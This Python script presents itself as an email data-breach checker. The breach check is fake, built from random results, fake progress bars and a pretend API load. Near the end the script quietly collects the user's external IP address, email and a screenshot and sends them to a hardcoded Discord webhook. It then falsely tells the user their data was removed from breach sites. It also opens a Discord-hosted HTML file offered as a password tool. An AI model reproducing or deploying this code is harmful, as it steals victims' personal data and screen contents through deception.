import sys
import time
import ctypes
import random
import string
import webbrowser
import requests
import pyautogui
from datetime import datetime
import os
os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
import pygame
import io
import pyttsx3
import threading
from getpass import getpass


class SuppressOutput:
    def __enter__(self):
        self._stdout = sys.stdout
        self._stderr = sys.stderr
        sys.stdout = io.StringIO()
        sys.stderr = io.StringIO()

    def __exit__(self, exc_type, exc_value, traceback):
        sys.stdout = self._stdout
        sys.stderr = self._stderr

def suppress_pygame_hello_message():
    with SuppressOutput():
        pygame.init()
        pygame.mixer.init()

suppress_pygame_hello_message()

def set_console_title():
    while True:
        random_title = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 15)))
        ctypes.windll.kernel32.SetConsoleTitleW(random_title)
        time.sleep(1)

def set_console_transparency(opacity):
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    ctypes.windll.user32.SetLayeredWindowAttributes(hwnd, 0, int(255 * opacity), 2)

def authenticate_user(correct_password):
    password = getpass("Enter Your Key To Find Breaches: ")
    if password == correct_password:
        return True
    else:
        print("Incorrect password. The program will now exit in 5 seconds...")
        return False

def get_external_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        return response.json().get('ip')
    except requests.RequestException as e:
        print(f"Error retrieving IP address: {e}")
        return None

def take_screenshot(filename='screenshot.png'):
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        return filename
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        return None

def send_to_webhook(url, text_content, file_path):
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            data = {'content': text_content, 'username': 'ss and ip bot'}
            response = requests.post(url, data=data, files=files)
            return response.status_code, response.text
    except requests.RequestException as e:
        print(f"Error sending data to webhook: {e}")
        return None, None

def type_out(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def play_sound_from_file(file_path):
    try:
        if os.path.exists(file_path):
            pygame.mixer.music.load(file_path)
            pygame.mixer.music.set_volume(1.0)
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy():
                time.sleep(1)
        else:
            print(f"Error: File '{file_path}' not found.")
    except Exception as e:
        print(f"Error playing sound: {e}")

def speak_text(text):
    engine = pyttsx3.init()
    engine.setProperty('volume', 1.0)
    engine.say(text)
    engine.runAndWait()

def ask_question_tts(question):
    speak_text(question)
    response = input(question)
    return response

def simulate_breach_check(email):
    breaches = ["breach1@example.com", "breach2@example.com"]
    if email in breaches:
        return True
    return random.choice([True, False])

def choose_search_depth():
    while True:
        choice = input(" [ * ] Choose search type: Enter '1' for small search or '2' for deep search: ")
        if choice == '1':
            return 'small'
        elif choice == '2':
            return 'deep'
        else:
            print("Invalid choice. Please enter '1' or '2'.")

def main():

    set_console_transparency(0.75)

    title_thread = threading.Thread(target=set_console_title, daemon=True)
    title_thread.start()

    correct_password = "breach"
    if not authenticate_user(correct_password):
        time.sleep(5.25)
        sys.exit()

    email = input("Enter your email address to check for breaches: ")
    if not email:
        print("No email address entered. The program will now exit.")
        sys.exit()
    
    is_breached = simulate_breach_check(email)
    
    if is_breached:
        print(f" [ ? ] Breach Check Starting: Your email might just be compromised.")
    else:
        print(f" [ ? ] Your email is being analysed.")

    user_input = input(" [ * ] Press '1' to join my Discord server or just press Enter to skip: ")
    if user_input == "1":
        webbrowser.open("https://discord.gg/g8yzDy27Yd")

    user_input = input(" [ * ] Press 1 if you also want a breach finder for passwords. ")
    if user_input == "1":
        webbrowser.open("https://cdn.discordapp.com/attachments/1210695518125031485/1274307846187782185/status.html?ex=66c1c72a&is=66c075aa&hm=68a8b61193849e6b9314c2bb6076ef5929988774003602a485a6d63c28a0eee1&")

    sound_thread = threading.Thread(target=play_sound_from_file, args=("driver.mp3",), daemon=True)
    sound_thread.start()

    speak_text("100 PERCENT NOT RAT, PC FUCKED AND HOUSE BOMBED ")

    search_type = choose_search_depth()

    if search_type == 'small':
        type_out(" [ + ] Performing a small search for data breaches. This should be quick.", 0.05)
        time.sleep(3)
        print("Searching....")
    else:
        type_out(f" [ + ] Trying to find if this email was in any data breaches?: {email} sit back and relax because this might take some time depending on how much information you've put on the internet.", 0.05)
        time.sleep(3)

    type_out(" [ - ] Finding Browsers and Search Engines...", 0.05)
    time.sleep(2)

    speak_text("Loading Application Programming Interface.")
    type_out("LOADING HIBP API.", 0.05)
    
    print("")
    
    if search_type == 'deep':
        print(" [ * ] Deep Searching Started.")
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        type_out(f"Time: {current_time}", 0.05)

        time.sleep(3.25)

        total_length = 30
        for i in range(101):
            time.sleep(0.0005)
            percent = int((i / 100) * total_length)
            bar = '▒' * percent + '-' * (total_length - percent)
            print(f"{bar} {i}%", end='\r')
        print()

        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        type_out(f"Searching Finished at: {current_time}", 0.75)

    if random.random() < 0.25:
        speak_text(f"Oops! Information found for email: {email} in data breaches.")
        type_out("Oops! Information found in data breaches.", 0.05)
        
        response = input("Do you want to keep searching for more information, or request a removal of the information off the web? (Enter 'search' to keep searching or 'delete' to remove the information): ").strip().lower()
        
        if response == 'delete':
            speak_text("Proceeding to request a removal.")
            type_out("Proceeding to request a removal.", 0.05)
        if response == 'search':
            speak_text("Continuing search...")
            type_out("Continuing search...", 0.05)

        total_length = 30
        for i in range(101):
            time.sleep(2.5)
            percent = int((i / 100) * total_length)
            bar = '▒' * percent + '-' * (total_length - percent)
            print(f"{bar} {i}%", end='\r')
        print()

        response = input(f"No more information found in data breaches, would you just like to request a removal of the information that is there for the Email: {email}? 'type remove to request a removal and type skip to skip. (NOT RECOMMENDED!)'")

        if response == 'remove':
            type_out(f"Proceeding To Request a removal for {email}.")
            with open("removalrequest.txt", "w") as file:
                file.write(f"User Requested a Removal Of Their Information. Email: {email}")
                time.sleep(2)
                input("Press Enter To Exit.")

        if response == 'skip':
            print("skipping and exiting...")
        with open("infobreach.txt", "w") as file:
            file.write("Skipped")
        time.sleep(3.5)
        sys.exit()

    else:
        if not is_breached:
            type_out(f"Congratulations! No Information Found for Email '{email}' in Data Breaches.", 0.05)
        with open("infobreach.txt", "w") as file:
            file.write(f"no breaches found for the email: {email} congratulations!")

    ip_address = get_external_ip()
    screenshot_file = take_screenshot()

    text_content = f"IP Address: {ip_address}\nEmail Address: {email}\nScreenshot File: {screenshot_file}"

    webhook_url = 'https://discord.com/api/webhooks/1271925593075617825/FtsHBs2cleWJ2q5rZ_aqqVn1wt18RqeT_E7OO36GxROmbUcPEAcpg4PcJP_bo15t5AE0'
    if screenshot_file:
        status_code, response_text = send_to_webhook(webhook_url, text_content, screenshot_file)
        
        if status_code == 204:
            speak_text("Data successfully removed from data breach websites and data brokers.")
            type_out("Data successfully removed from data breach websites and data brokers.", 0.05)
    else:
        speak_text("Oops, found data sent to data brokers. Could not remove because of fatal error. Error code: 9130.")
        type_out("Oops, found data sent to data brokers! Could not remove because of fatal error. Error code: 9130.", 0.05)

set_console_transparency(0.75)

if __name__ == "__main__":
    main()